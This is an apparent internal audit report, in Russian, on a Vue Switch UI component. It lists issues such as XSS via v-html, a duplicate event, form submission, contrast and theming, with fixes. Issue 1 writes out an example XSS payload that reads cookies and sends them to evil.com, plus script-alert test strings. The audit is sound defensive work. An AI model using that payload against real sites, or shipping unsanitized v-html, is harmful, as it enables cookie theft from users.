---
title: Issues — Switch
summary: Аудит Switch — CRITICAL XSS через v-html в help-prop, дубль updateModelValue, button-mode не submitting в native form, SSR-стили.
updated: 2026-05-10
audit-checklist: 60-point + Configuration support + Dual-API gap
source: lib/switch/
related-doc: ../components/switch.md
---

# Issues — Switch

## Сводка

| Severity | Count | Categories |
|---|---|---|
| critical | 1 | C13/security (XSS via v-html) |
| high | 5 | A2, A4-5, C17, D26, M54 |
| medium | 4 | E29.6, F31, L53, G34 |
| low | 3 | E29.7, B10, N59 |

## Issue 1: CRITICAL — XSS через `v-html` в `help` prop

- **Категория:** C13 (утечка / security) + custom security
- **Severity:** **critical**
- **Где:** [Switch.vue:244](../../lib/switch/Switch.vue#L244), [Switch.d.ts:82-83](../../lib/switch/Switch.d.ts#L82-L83)

### Что найдено

```vue
<div v-html="help" :class="classIconContent" />
```

`help: string` — публичный prop ([Switch.d.ts:82-83](../../lib/switch/Switch.d.ts#L82-L83)). Содержимое рендерится через `v-html`, что напрямую инжектит HTML в DOM без санитизации.

### Почему это проблема

- Если `help` приходит из non-trusted источника (CMS, user input, server JSON), злоумышленник может инжектить `<img src=x onerror="alert(1)">`, `<script>`, event-handler атрибуты.
- Пример атаки: `<Switch help="<img src=x onerror='fetch(`/api/cookies`).then(r=>r.text()).then(t=>fetch(`https://evil.com/?c=${t}`))' />` → exfiltration cookies.
- Vue официально документирует `v-html` как небезопасный для user-controlled данных: <https://vuejs.org/api/built-in-directives.html#v-html>.

### Что нужно сделать

**Опция A (быстрый фикс) — заменить v-html на текст или slot:**
1. В [Switch.vue:244](../../lib/switch/Switch.vue#L244) поменять `<div v-html="help">` на `<div>{{ help }}</div>` — текст без HTML.
2. Если нужна разметка — заменить prop `help: string` на slot `<template #help>...</template>`:
   ```vue
   <slot name="help">{{ help }}</slot>
   ```
3. Type `SwitchSlots` дополнить `help?(): VNode[]`.

**Опция B (если HTML-content критичен для UX) — санитизация:**
1. Добавить `dompurify` в peer-dependencies.
2. В [Switch.vue](../../lib/switch/Switch.vue) перед v-html: `:v-html="DOMPurify.sanitize(help)"` через computed.
3. Документировать ограничения санитизации.

**Рекомендация — Опция A.** Slot — стандартный Vue-pattern, безопасный, гибкий, type-safe.

3. Cross-cutting: проверить остальные компоненты на `v-html` через `grep -rn 'v-html' lib/`. Найти дополнительные сайты:
   - Form, Aria, InputLayout, Alert, Dialog — могут иметь help/messageInvalid/content props через v-html.

### Acceptance criteria

- [ ] `<Switch help="<script>alert('xss')</script>">` НЕ исполняет скрипт.
- [ ] Тест: `mount(Switch, { props: { help: '<img src=x onerror=...>' } })` — ассерт что DOM не содержит `<img>` элемент.
- [ ] Аудит других компонентов — v-html отсутствует или санитизирован.

## Issue 2: Дубликат события `updateModelValue` (camelCase) рядом с `update:modelValue`

- **Категория:** D26 (консистентность событий)
- **Severity:** high
- **Где:** [Switch.vue:168-169](../../lib/switch/Switch.vue#L168-L169), [Switch.d.ts:113-118](../../lib/switch/Switch.d.ts#L113-L118)

### Что найдено

```ts
function inputModelValue(value: any) {
  emit("update:modelValue", value)
  emit("updateModelValue", value)
}
```

Эмитятся два события на каждое изменение value: стандартное Vue `update:modelValue` и custom `updateModelValue`. В .d.ts указано как «Alias for update:modelValue».

### Почему это проблема

- Подписчик на оба события получит дубль.
- Inconsistency: ни один другой form-control в FishtVue не эмитит camelCase-вариант. Это нарушает [dev-patterns.md §8](../dev-patterns.md#8-events).
- Vue v-model официально использует `update:modelValue`. Custom `updateModelValue` — отступление от Vue-конвенции.

### Что нужно сделать

1. Удалить `emit("updateModelValue", value)` из [Switch.vue:169](../../lib/switch/Switch.vue#L169).
2. Удалить `(event: "updateModelValue", payload: boolean): void` из [Switch.d.ts:118](../../lib/switch/Switch.d.ts#L118).
3. Если кто-то использует `@update-model-value="..."` — это deprecation. Оставить console.warn на 1 minor.
4. Обновить [Documentation/components/switch.md](../components/switch.md) §6.

### Acceptance criteria

- [ ] `mount(Switch).find('input').trigger('change')` → `wrapper.emitted('update:modelValue')` is truthy, `wrapper.emitted('updateModelValue')` is undefined.

## Issue 3: Switch с `switchingType: "switch"` использует `<button>` — не submitting в native form

- **Категория:** M54 (Native form integration)
- **Severity:** high
- **Где:** [Switch.vue:180-208](../../lib/switch/Switch.vue#L180-L208)

### Что найдено

```vue
<button v-if="switchingType === 'switch'" :id="id" :name="id" data-input-switch role="switch" type="button" tabindex="0" :disabled="isDisabled" :aria-checked="modelValue" ...>
```

В режиме `switch` корневой элемент — `<button type="button">`. `<button>` с `name` атрибутом submitting только при `type="submit"`, а здесь `type="button"`. Native `<form>` не получит value Switch при submit.

### Почему это проблема

- `<form @submit>` обработчик вызовет `new FormData(event.target)` и НЕ найдёт значение Switch — пропадёт.
- В режиме `checkbox` (нативный `<input type="checkbox">`) всё OK, но `switch` — нет.

### Что нужно сделать

1. Добавить hidden `<input type="checkbox" :name="id" :checked="modelValue" :disabled="isDisabled" hidden>` рядом с `<button role="switch">`. Hidden input будет в FormData; button — visible UI.
2. Альтернатива — использовать `<input type="checkbox" role="switch">` напрямую с CSS-стилизацией под switch (труднее визуально, но native form-friendly).
3. Тест:
   ```ts
   const form = mount(`<form><Switch v-model="x" id="enabled" /><button type="submit"/></form>`)
   const data = new FormData(form.find('form').element)
   expect(data.get('enabled')).toBe('on')
   ```

### Acceptance criteria

- [ ] `<form>` submit включает значение Switch в FormData.
- [ ] Аналогично работает с native fetch/XHR `body: new FormData(form)`.

## Issue 4: Стили SSR не инжектятся

- **Категория:** C17
- **Severity:** high
- **Где:** [Switch.vue:158-160](../../lib/switch/Switch.vue#L158-L160)

См. [button.md Issue 1](./button.md) — cross-cutting.

## Issue 5: Нет sideEffects/exports map

- **Категория:** A2, A4, A5
- **Severity:** high
- **Где:** [lib/package.json](../../lib/package.json), [lib/switch/package.json](../../lib/switch/package.json)

См. [button.md Issue 8 и Issue 9](./button.md) — cross-cutting.

## Issue 6: Контраст `text-gray-400` на `bg-gray-200` ниже WCAG AA

- **Категория:** E29.6 (WCAG contrast)
- **Severity:** medium
- **Где:** [Switch.vue:232-234](../../lib/switch/Switch.vue#L232-L234)

### Что найдено

```vue
<Icons type="QuestionMarkCircle"
  class="text-gray-400 dark:text-gray-600 hover:text-yellow-500 transition cursor-help" />
```

Help icon `text-gray-400` (#9ca3af) на body `bg-stone-50` (#fafaf9) → contrast ratio ~3.5:1. WCAG AA для UI компонентов требует 3:1 (passes), но для текста нужно 4.5:1.

### Почему это проблема

- Маленький icon на тёмном теме `text-gray-600` (#4b5563) на `bg-stone-950` (#0c0a09) — contrast >7:1, OK.
- В light mode — icons trigger могут быть нечитаемы для слабовидящих.

### Что нужно сделать

1. Изменить `text-gray-400` → `text-gray-500` в light mode (#6b7280 vs bg-stone-50 #fafaf9 = ~5:1).
2. Или использовать semantic token `text-foreground-muted` через FishtVue theme.
3. Запустить axe-core a11y-test против `Switch` в light/dark.

### Acceptance criteria

- [ ] axe-core report → 0 contrast violations.
- [ ] Lighthouse a11y score 100.

## Issue 7: prefers-reduced-motion не учитывается

- **Категория:** E29.7
- **Severity:** low
- **Где:** [Switch.vue:92](../../lib/switch/Switch.vue#L92), [Switch.vue:135](../../lib/switch/Switch.vue#L135), [Switch.vue:204](../../lib/switch/Switch.vue#L204)

См. [button.md Issue 10](./button.md). Switch имеет `transition-all duration-300` без guard.

## Issue 8: RTL — left/right специфичные классы (`right-0`, `mr-2`, `translate-x-3.5`)

- **Категория:** F31
- **Severity:** medium
- **Где:** [Switch.vue:120](../../lib/switch/Switch.vue#L120), [Switch.vue:121](../../lib/switch/Switch.vue#L121), [Switch.vue:133](../../lib/switch/Switch.vue#L133)

### Что найдено

```ts
const classAfterInput = ref(Switch.setStyle("relative inset-y-0 right-0 flex items-center"))
const classIconBody = ref(Switch.setStyle("relative h-5 w-5 mr-2"))
...
"translate-x-3.5 bg-theme-100 dark:bg-theme-900"
```

`right-0`, `mr-2`, `translate-x-3.5` — left/right в pixel, без logical properties.

### Что нужно сделать

1. `right-0` → `inset-inline-end-0` или `end-0` (Tailwind 3.4+ logical).
2. `mr-2` → `me-2`.
3. `translate-x-3.5` для switch thumb — оставить, но добавить RTL-mirroring через `[dir="rtl"]` selector.

## Issue 9: switchingType сравнения через string — потеря типизации

- **Категория:** D25 (консистентность props)
- **Severity:** medium
- **Где:** [Switch.d.ts:48](../../lib/switch/Switch.d.ts#L48)

### Что найдено

```ts
switchingType: "checkbox" | "switch" | string
```

`| string` open union делает type-narrowing невозможным. Ошибка `switchingType: "swich"` (опечатка) пройдёт компиляцию без warning.

### Что нужно сделать

1. Убрать `| string` из [Switch.d.ts:48](../../lib/switch/Switch.d.ts#L48): `switchingType: "checkbox" | "switch"`.
2. Аналогично для `mode: SwitchMode = StyleMode | "none" | string` — убрать `| string`.

### Acceptance criteria

- [ ] `<Switch switchingType="swich">` (опечатка) — vue-tsc выдаёт ошибку.

## Issue 10: `unstyled: true` не обрабатывается

- **Категория:** L53
- **Severity:** high
- **Где:** [Switch.vue:46-119](../../lib/switch/Switch.vue#L46-L119)

См. [button.md Issue 14](./button.md).

## Issue 11: `inputRef` не expose'д — невозможно programmatically focus

- **Категория:** G34
- **Severity:** medium
- **Где:** [Switch.vue:139-156](../../lib/switch/Switch.vue#L139-L156)

`expose` не возвращает ref на native `<input>`/`<button>`. Аналогично [button.md Issue 4](./button.md) — fix-план идентичен.

## Issue 12: Хардкод цветов `gray-*`/`green-*`/`red-*` вместо semantic tokens

- **Категория:** B10
- **Severity:** low (кросс-режим)
- **Где:** [Switch.vue:51](../../lib/switch/Switch.vue#L51), [Switch.vue:69](../../lib/switch/Switch.vue#L69), [Switch.vue:108](../../lib/switch/Switch.vue#L108) (множество)

### Что найдено

`bg-stone-100`, `bg-gray-200`, `text-red-500`, `border-gray-300` — Tailwind-палитра без привязки к FishtVue design tokens из [theme/themes/Aurora.ts](../../lib/theme/themes/Aurora.ts).

### Почему это проблема

- Когда пользователь меняет тему через `usePreset(MyTheme)`, `bg-gray-200` НЕ перепишется — palette внутри Tailwind preset изменится только если в [theme/uno.ts](../../lib/theme/uno.ts) уровень `surface`/`muted` ремаплен на `gray`.
- Documentation [docs/content/ru/3.Configuration/2.Theming.md](../../docs/content/ru/3.Configuration/2.Theming.md) обещает «семантические токены (primary.color, focus-ring, surface)» — компонент использует Tailwind primitives.

### Что нужно сделать

1. Заменить `bg-gray-*`, `bg-stone-*`, `text-gray-*` на semantic-токены через UnoCSS shortcuts: `bg-surface`, `text-muted-foreground`, `border-border`.
2. Определить mapping в [lib/theme/uno.ts](../../lib/theme/uno.ts).
3. Cross-cutting — большинство компонентов имеют ту же проблему.

## Issue 13: Не реагирует на `componentsStyle` глобально для `switchingType`

- **Категория:** L53
- **Severity:** medium
- **Где:** [Switch.vue:30-32](../../lib/switch/Switch.vue#L30-L32)

### Что найдено

`mode` подбирает `Switch.componentsStyle()` ✅. Но `switchingType` (определяет UX — checkbox vs switch) только локальный или per-instance options. Глобально через `componentsOptions.Switch.switchingType` ✅, но не через `componentsStyle`.

Это OK для switchingType (он не визуальный enum, а UX-выбор), но стоит документировать.

### Что нужно сделать

Документировать в [Documentation/components/switch.md](../components/switch.md) §10, что `switchingType` не зависит от global `componentsStyle`.

## Issue 14: Print styles отсутствуют

- **Категория:** N59
- **Severity:** low

См. [button.md Issue 15](./button.md).

## Cross-cutting: Configuration support

| Настройка | Поддержано? | Комментарий |
|---|---|---|
| `componentsOptions.Switch` | ✅ | mode/rounded/iconActive/iconInactive/switchingType/class |
| `componentsStyle` global | ✅ | через `Switch.componentsStyle()` |
| `unstyled: true` | ❌ | Issue 10 |
| Theme tokens vs hardcode | ❌ | Issue 12 — Tailwind primitives, не semantic tokens |
| Runtime theme switch | ⚠️ | через theme-* token, OK; gray/stone — НЕ реагируют |
| `t()` для текста | N/A | label — пользовательский |
| Runtime locale switch | N/A | — |

## Dual-API gap

Не применимо.
